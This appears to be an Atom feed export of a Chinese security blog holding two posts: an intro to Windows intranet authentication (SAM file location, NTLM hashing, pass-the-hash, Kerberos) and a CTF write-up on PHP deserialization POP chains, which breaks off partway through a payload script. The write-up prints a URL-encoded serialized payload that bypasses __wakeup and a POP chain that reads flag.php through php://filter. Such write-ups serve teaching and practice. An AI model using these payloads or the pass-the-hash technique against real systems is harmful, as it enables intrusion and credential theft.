<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>onekingcc&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://onekingcc.github.io/"/>
  <updated>2020-12-18T09:18:58.173Z</updated>
  <id>http://onekingcc.github.io/</id>
  
  <author>
    <name>onekingcc</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网知识基础</title>
    <link href="http://onekingcc.github.io/2020/12/18/%E5%86%85%E7%BD%91%E7%9F%A5%E8%AF%86%E5%9F%BA%E7%A1%80/"/>
    <id>http://onekingcc.github.io/2020/12/18/内网知识基础/</id>
    <published>2020-12-18T08:56:55.297Z</published>
    <updated>2020-12-18T09:18:58.173Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h2><p>路径：</p><p>C:\Windows\System32\config</p><p><img src="/images/shentouceshi/clip_image001.png" alt="img"></p><p>登录的过程中，系统就会自动去读取SAM文件中的密码，然后与用户输入的密码进行比对。</p><h2 id="NTLM（NT-LAN-Manager）HASH"><a href="#NTLM（NT-LAN-Manager）HASH" class="headerlink" title="NTLM（NT LAN Manager）HASH"></a>NTLM（NT LAN Manager）HASH</h2><ol><li><p>密码在windows中都是hash进行存储的，将用户的明文密码经过加密之后存储到sam中。</p></li><li><p>当用户登录的时候，window会将用户输入的明文密码加密成NTLM Hash，然后再与sam中NTLM hash 进行比较</p></li></ol><h3 id="NTLM-hash——产生"><a href="#NTLM-hash——产生" class="headerlink" title="NTLM hash——产生"></a>NTLM hash——产生</h3><p>admin-&gt;hex(16进制编码)= 61646d696e</p><p>61646d696e-&gt;Unicode=610064006d0069006e00</p><p>610064006d0069006e00-&gt;MD4=209c6174da490caeb422f3fa5a7ae634</p><p>admin=&gt;209c6174da490caeb422f3fa5a7ae634</p><h2 id="本地认证流程"><a href="#本地认证流程" class="headerlink" title="本地认证流程"></a>本地认证流程</h2><p><img src="/images/shentouceshi/clip_image002.png" alt="img"></p><p>Winlogon.exe 是windows NT用户登录程序，用户管理用户的登录和登出</p><p>LSASS用于winodws安全机制，本地安全和登录策略。</p><h2 id="Windows-网络认证"><a href="#Windows-网络认证" class="headerlink" title="Windows 网络认证"></a>Windows 网络认证</h2><p>内网中很多时候遇到的基本都是工作组环境，工作组就相当于一个独立的网络环境，只能进行点对点进行，没有信托。通俗来说有点像可信赖的中介，需要进行进行双方的沟通。</p><p><strong>工作组</strong>：相当于逻辑上的网络环境，比如存在两个子网，本来是不可达，但是可以通过路由交换的方式然后达到互通的效果。</p><p>举个例子假如处于局域网中的A和B，A访问B主机上的资源，这时候就需要将B主机上的账户凭证发送给B主机，认证之后才能访问B主机上的资源。比如SMB服务。（共享服务，文件的创建，修改之类，但是认证还得依赖于NTLM协议）</p><h2 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h2><p>早期SMB是明文方式的传输，后来就出现了LAN Manager Challenge/Response 验证协议 简称LM </p><p><img src="/images/shentouceshi/clip_image003.png" alt="img"></p><p>server端收到client端后会去本地账户列表判定是否有对应share_user</p><p>1.如果有，就生成challenge，并从本地去获取user存储对应的NTLM Hash，使用NTLM Hash加密challenge，生成一个Net-NTLM Hash放在内存中，并将challenge发送给client。如果没有，就认证失败</p><p>2.client收到challenge后，将自己提供的share_user的密码转化为NTLM hash，使用net-NTLM hash加密challenge，生成response，，最后将response 发送给server。</p><p>3.server端收到response，将response与之前的NET-NTLM hash进行比较，如果相等则认证通过。</p><h2 id="PASS-THE-HASH（哈希传递）"><a href="#PASS-THE-HASH（哈希传递）" class="headerlink" title="PASS THE HASH（哈希传递）"></a>PASS THE HASH（哈希传递）</h2><p>哈希传递：其实就是使用用户名对应的NTLM hash将服务器给出的challenge加密，生成一个response完成认证。</p><p>哈希传递能够在不需要账户明文的方式完成一个认证的一个技术。</p><p>哈希传递作用：</p><p>解决在渗透中获取不到明文密码，破解不了NTLM Hash然后想发现更多的东西扩大战果的东西</p><h2 id="Active-Directory（活动目录）"><a href="#Active-Directory（活动目录）" class="headerlink" title="Active Directory（活动目录）"></a>Active Directory（活动目录）</h2><p><strong>Active Directory 中存储了有关网络对象的信息，能让管理员和用户很方便的找到这些信息，而且他存储的方式是以结构化的数据存储方式，并且以此为基础对目录信息进行合乎逻辑的分层。</strong></p><p><strong>网络对象：计算机，用户，用户组，域，组织单位以及安全策略。</strong></p><p>这里的活动目录其实是安装到域控上的。</p><h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><p>Kerbos协议是一种认证协议，并不是授权，使用的是票据进行认证，并不是challenge-response这种质询的方式。</p><p>这里需要知道KDC概念</p><p>KDC：用于处理Kerberos身份验证请求，通常是域控制器，或者至少具有对用户和服务机密（哈希）的访问权，并且由2个服务组成，</p><p><img src="/images/shentouceshi/clip_image004.png" alt="img"></p><p><img src="/images/shentouceshi/clip_image005.png" alt="img"></p><p>客户端仅要求提供证明其身份的票证，对其进行缓存并在连接服务时使用它。客户端和服务之间没有用于认证的开放隧道，实际上，整个认证过程（在正常情况下）发生在客户端和KDC之间，甚至没有连接到服务。当然这里只是进行了初步的了解，具体深入可以看看这篇文章<a href="https://blog.redforce.io/windows-authentication-attacks-part-2-kerberos/" target="_blank" rel="noopener">https://blog.redforce.io/windows-authentication-attacks-part-2-kerberos/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;SAM&quot;&gt;&lt;a href=&quot;#SAM&quot; class=&quot;headerlink&quot; title=&quot;SAM&quot;&gt;&lt;/a&gt;SAM&lt;/h2&gt;&lt;p&gt;路径：&lt;/p&gt;
&lt;p&gt;C:\Windows\System32\config&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/she
      
    
    </summary>
    
      <category term="内网" scheme="http://onekingcc.github.io/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="web安全" scheme="http://onekingcc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>记一次php反序例化pop链学习</title>
    <link href="http://onekingcc.github.io/2020/11/23/%E8%AE%B0%E4%B8%80%E6%AC%A1php%E5%8F%8D%E5%BA%8F%E4%BE%8B%E5%8C%96pop%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
    <id>http://onekingcc.github.io/2020/11/23/记一次php反序例化pop链学习/</id>
    <published>2020-11-23T13:00:00.000Z</published>
    <updated>2020-11-23T13:37:00.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="夯实基础"><a href="#夯实基础" class="headerlink" title="夯实基础"></a>夯实基础</h4><p>这里先直接看一下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置一个类A</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">"onekingcc"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__construct() call&lt;/br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n__destruct() call&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString() call&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__sleep() call&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"name"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__wakeup() call&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__get() call&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($property, $value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="keyword">echo</span> <span class="string">"\n__set() call&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$property = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__invoke() call&lt;/&lt;br&gt;&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br><span class="line"><span class="keyword">echo</span> $a-&gt;bbbb;</span><br><span class="line">$a-&gt;name = <span class="string">"pro"</span>;</span><br><span class="line"><span class="keyword">echo</span> $a-&gt;name;</span><br><span class="line">$a();</span><br></pre></td></tr></table></figure><p>看打印出来的是什么吧</p><p><img src="/images/daimashenji/image-20201114091611869.png" alt="image-20201114091611869"></p><p>如何进行调用的</p><p><img src="/images/daimashenji/image-20201114102343155.png" alt="image-20201114102343155"></p><p>总结一下就是下面这些了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__construct   当一个对象创建时被调用，</span><br><span class="line">__destruct   当一个对象销毁时被调用，</span><br><span class="line">__toString   当一个对象被当作一个字符串被调用。</span><br><span class="line">__wakeup()   使用unserialize时触发</span><br><span class="line">__sleep()    使用serialize时触发</span><br><span class="line">__destruct()    对象被销毁时触发</span><br><span class="line">__call()    在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic()    在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get()    用于从不可访问的属性读取数据</span><br><span class="line">__set()    用于将数据写入不可访问的属性</span><br><span class="line">__isset()    在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset()     在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString()    把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke()   当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h4 id="小试牛刀"><a href="#小试牛刀" class="headerlink" title="小试牛刀"></a>小试牛刀</h4><p>这里直接用一道ctf的题目来加深理解</p><p><a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP" target="_blank" rel="noopener">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP</a></p><p><img src="/images/daimashenji/image-20201121152949982.png" alt="image-20201121152949982"></p><p>这里扫了一下目录发现存在<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p><p><img src="/images/daimashenji/image-20201121153248956.png" alt="image-20201121153248956"></p><p>Index.php主要内容如下，内容比较简单这里首先包含了一个class.php，然后$_GET一个select参数,将传进来的GET进来的select参数进行反序例化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">  $select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">  $res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里包含了flag.php很明显是假的flag</p><p><img src="/images/daimashenji/image-20201121154243734.png" alt="image-20201121154243734"></p><p>包含的Class.php文件内容，主要看这个文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">         </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里定义属性了2个private 属性的变量$username、$password,这个之前讲过如果是private类型修饰的会有一些不可见字符。接着通过<em>__construct()写入2个变量的值，</em> _ wakup()函数会在反序例化的时候自动调用，将username的值赋值为guest,然后往下看到就是destruct()函数，这个函数在反序例化结束的时候会被调用，这里想拿到flag只有当pasword等于100并且username等于admin的时候才会打印flag。</p><p>现在很清楚这个题解出来的条件是：<strong>username=admin password=100</strong>但是这里有一个问题就是：当每次反序例化的时候会去自动调用wakeup()函数就会将username值赋值为guest，条件就成立不了，所以这里存在一个绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">"100"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$user = <span class="keyword">new</span> Name();</span><br><span class="line">$str = urlencode(serialize($user));</span><br><span class="line">var_dump($str);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里存在不可见字符%00，这里可以发现如果没有加urlencode()函数在php7 中是没有空格。</p><p><img src="/images/daimashenji/image-20201121175143755.png" alt="image-20201121175143755"></p><p>绕wakeup函数：</p><p>反序列化字符串中，属性个数的值大于其真实值，则跳过__wakeup()执行。这里具体为啥可以绕，原因就是因为php底层的bug问题。</p><p>这样得到最终的payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Name%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22100</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>拿到flag：</p><p><img src="/images/daimashenji/image-20201121180751850.png" alt="image-20201121180751850"></p><h4 id="EZPOP"><a href="#EZPOP" class="headerlink" title="EZPOP"></a>EZPOP</h4><p>这里还是用题目来学习一下这样更有助于理解</p><p><a href="https://buuoj.cn/challenges#[MRCTF2020]Ezpop" target="_blank" rel="noopener">https://buuoj.cn/challenges#[MRCTF2020]Ezpop</a></p><p>打开之后就是一段代码</p><p><img src="/images/daimashenji/image-20201121184613760.png" alt="image-20201121184613760"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;<span class="comment">//当前对象访问str再访问source，然后返回这个值，就是把类当作字符串使用时触发</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体看下来一共3个类，首先如果传入一个pop参数，然后就会将传入的POP进行反序例化，如果不是用get的话就new一个show的对象，显示源码。所以就在页面看到welcome to index.php</p><p>可以发现可以利用的就是在进行反序例化的时候会去调用show类的wakeup方法，然后wakeup方法中用preg_match()方法会去对字符串进行匹配搜素，然后$this-&gt;source是可控的，指向的是show类中$source变量,如果$source是一个字符就会与前面的正则进行比较，如果是一个类，那么就会去寻找类所在的__tostring()方法。</p><p>这样就可以有个大致思路：</p><p>$source =new show //new一个show的类指向一个新的实例化对象 ，再将<strong>tostring()里面的str 指向一个Test类，这时候就是Test中的类指向的source,这时候就是取str内中的soucre值 ，然后就去调用Test类中的</strong>get()方法，会发现里面并没有key的的值，这里的值没有也没有关系，然后就会调用$function = $this-&gt;p;return function(),这里如果将$p构造成一个new modifiler ，就可以将它作为一个函数传出去,因为$this-&gt;p是一个类变量，当类变量直接当成函数调用时，就会调用魔术方法invoke() ,然后就可以控制var </p><h4 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h4><p>1.在进行反序例化的时候会去调用show类的wakeup方法，wakeup方法用preg_match()方法会去对字符串进行匹配搜素，然后$this-&gt;source是可控的，指向的是show类中$source变量,$this-&gt;source如果是一个类，那么就会去寻找类所在的__tostring()方法。</p><p>2.如果tostring()方法中的$this-&gt;str 中的str赋值为一个实例化的Test类，那就不含有source属性，然后就会去调用Test中的get()方法</p><p>3.如果__get()中$this-&gt;p赋值为Modifiler，那么就是MOdifiler相当于这个类当成函数处理，然后就会去调用 _invoke()方法。</p><p>4.然后利用文件包含使用invoke()就可以拿到flag了。</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//Modifier类，把$var的值写成伪协议读源码</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">'php://filter/read=convert.base64-encode/resource=flag.php'</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//使用反序列化触发__wakeup，__wakeup直接触发__toString，然后访问source触发__get()</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str= <span class="keyword">new</span> Test();</span><br><span class="line">       </span><br><span 